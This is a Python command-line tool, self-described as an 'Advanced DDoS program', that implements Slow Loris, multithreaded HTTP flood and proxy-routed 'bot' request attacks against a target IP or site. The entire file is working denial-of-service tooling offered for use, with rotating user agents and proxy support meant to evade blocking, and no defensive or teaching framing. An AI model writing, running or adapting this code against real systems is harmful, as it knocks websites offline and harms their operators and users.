#!/usr/bin/env python3
# -*- coding:UTF-8 -*-

from argparse import ArgumentParser, HelpFormatter
from threading import Thread
from requests import get
from random import choice, randint
from time import sleep
from datetime import datetime
import socket

__author__ = "Hichigo THT"
__license__ = "GPLv3"
__version__ = "1.0.1"
__status__ = "Production"
__date__ = "20.04.2019"

def NewUsage(name=None):
    return """mentorddos.py [-h]
        [--method [slow_loris/http_flood/bot] ]
        [--threads [number] ]
        [--ip [IP] ]
        [--port [Port] ]
    """

def ParseArgs():
    parser = ArgumentParser(description="Advanced DDoS program. powered: S4kdt4", usage=NewUsage())
    parser._optionals.title = 'Usable Arguments'
    parser.add_argument("--method", help="Determines the attack method.", type=str)
    parser.add_argument("--threads", help="Determines the number of cores to be used in the attack.", type=int)
    parser.add_argument("--ip", help="Determines the IP address to attack.", type=str)
    parser.add_argument("--port", help="Specifies the Port number to be used.", type=int)
    parser.add_argument("--socket", help="Determines the number of sockets to be opened.", type=int)
    parser.add_argument("--useproxy",  action="store_true", help="Determines the use of proxy in bot attack.")
    parser.set_defaults(useproxy=False)
    parser.set_defaults(threads=1)
    parser.set_defaults(socket=50)
    args = parser.parse_args()
    if (args.method == None):
        print(parser.print_help())
        exit(0)
    return args

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

def print_error(msg):
    t = datetime.now().strftime("%H:%M:%S ")
    print("[" + t + "] [HATA] " + msg)

def print_status(msg):
    t = datetime.now().strftime("%H:%M:%S ")
    print("[" + t + "] [OK]   " + msg)

class SlowLoris:
    def __init__(self, ip=None, site=None, port=None):
        if (ip != None):
            self.host = socket.gethostbyaddr(ip)
        else:
            self.host = socket.gethostbyname(site)
        self.port = port
        self.run = False
        self.sockets = []
        self.threads = []
        self.writedbytes = 0
    
    def CreateSocket(self, number):
        for i in range(number):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.host, self.port))
                self.sockets.append(sock)
            except socket.error:
                print_error("During the Slow Loris attack " + str(i + 1) + ". socket cannot be opened!")
                
    
    def ConnectSockets(self):
        for socket in self.sockets:
            socket.send("GET /?{} HTTP/1.1\r\n".format(randint(0, 2000)).encode("utf-8"))
            socket.send("User-Agent: {}\r\n".format(choice(USER_AGENTS)).encode("utf-8"))
            socket.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

    def Attack(self):
        self.run = True
        while (self.run):
            for socket in self.sockets:
                try:
                    self.writedbytes = self.writedbytes + socket.send("X-a: {}\r\n".format(randint(1, 5000)).encode("utf-8"))
                    print_status("Number of bytes written: " + str(self.writedbytes))
                except KeyboardInterrupt:
                    print_status("Stopping the Attack!")
                    self.Stop()
                except ConnectionAbortedError:
                    print_error("A socket has failed, a new one is opening!")
                    socket.close()
                    self.sockets.remove(socket)
                    self.CreateSocket(1)
                    
            sleep(15)
                

    def CreateAttackThread(self):
        self.threads.append(
            Thread(target=self.Attack).start()
        )
    
    def Stop(self):
        self.run = False
        self.CloseAllSockets()

    def CloseAllSockets(self):
        for socket in self.sockets:
            socket.close()
    
    def CloseSocketByIndex(self, index):
        self.sockets[index].close()

class SimpleHTTP:
    def __init__(self, ip=None, site=None, port=None):
        if (ip != None):
            self.host = "http://" + ip
        else:
            self.host = "http://" + site
        self.port = port
        self.run = False
        self.requestnumber = 0
        self.threads = []
    
    def Attack(self):
        while (self.run):
            try:
                get(self.host, headers={
                    "User-Agent": choice(USER_AGENTS)
                })
                self.requestnumber = self.requestnumber + 1
                print_status("Number of requests sent: " + str(self.requestnumber))
            except Exception:
                pass

    def CreateAttackThread(self, number):
        self.run = True
        for _ in range(number):
            self.threads.append(
                Thread(target=self.Attack).start()
            )
    
    def Close(self):
        self.run = False

class BOT:
    def __init__(self, ip=None, site=None, proxy=None):
        if (ip != None):
            self.host = "http://" + ip
        else:
            self.host =  "http://" + site
        self.run = False
        self.requestnumber = 0
        self.threads = []
        self.proxy = proxy
        self.sleep1min = False
        with open("./botsites.txt") as file:
            self.websites = file.readlines()
    
    def Attack(self):
        self.run = True
        while (self.run):
            for website in self.websites:
                website = website.replace("\r","")
                website = website.replace("\n","")
                res = None
                currentproxy = None
                if (self.proxy != None):
                    try:
                        currentproxy = choice(self.proxy).replace("\n","").replace("\r","")
                        res = get(website + self.host, headers={
                            "User-Agent": choice(USER_AGENTS)
                        }, proxies={"http": "http://" + currentproxy})
                    except:
                        print_error(currentproxy + " Proxy'it is not working!")
                        continue
                else:
                    res = get(website + self.host, headers={
                        "User-Agent": choice(USER_AGENTS)
                    })

                if (res == None):
                    pass
                elif (res.status_code == 403):
                    print_error("We may have been blocked due to too many requests, please try again in a few minutes.!")
                    continue
                elif (res.status_code == 200):
                    self.requestnumber = self.requestnumber + 1
                    print_status("Number of bot requests sent: " + str(self.requestnumber))
                    continue
                else:
                    if (self.proxy != None):
                        print_error(currentproxy + " Proxy'is not working!")
                    continue


    def CreateAttackThread(self,number):
        for _ in range(number):
            self.threads.append(
                Thread(target=self.Attack).start()
            )

    def Stop(self):
        self.run = False

def main():
    args = ParseArgs()

    if (args.method == "slow_loris"):
        if (args.threads == None or args.socket == None):
            print_error("The number of cores and sockets must be determined in a Slow Loris attack.")
            exit(0)
        
        slow_loris = SlowLoris(site=args.ip, port=args.port)
        
        print_status("For Slow Loris attack " + str(args.socket) + " socket opens!")
        slow_loris.CreateSocket(args.socket)
        
        slow_loris.ConnectSockets()

        print_status("For Slow Loris attack " + str(args.threads) + " socket opens!")
        for _ in range(args.threads):
            slow_loris.CreateAttackThread()
        
        print_status("For Slow Loris attack!")
    
    elif (args.method == "http_flood"):
        if (args.threads == None):
            print_error("HTTP Flood number of cores must be determined in the attack.")
            exit(0)
        
        http_flood = SimpleHTTP(ip=args.ip, site=args.ip, port=args.port)

        print_status("HTTP Flood for the attack " + str(args.threads) + " open core!")
        http_flood.CreateAttackThread(args.threads)

        print_status("HTTP Flood attack launched!")

    elif (args.method == "bot"):
        if (args.threads == None):
            print_error("Bot The number of cores in the attack must be determined.")
            exit(0)
        
        proxies = []
        with open("./proxies.txt") as f:
            for proxy in f.readlines():
                proxies.append(proxy.replace("\r",""))

        bot = None

        if (args.useproxy == False):
            bot = BOT(ip=args.ip, site=args.ip)
        else:
            bot = BOT(ip=args.ip, site=args.ip, proxy=proxies)

        print_status("Bot for the attack " + str(args.threads) + " cores are unlocked!")
        bot.CreateAttackThread(args.threads)

        print_status("BOT The attack was launched!")

        
        

        
if __name__ == "__main__":
    main()
    




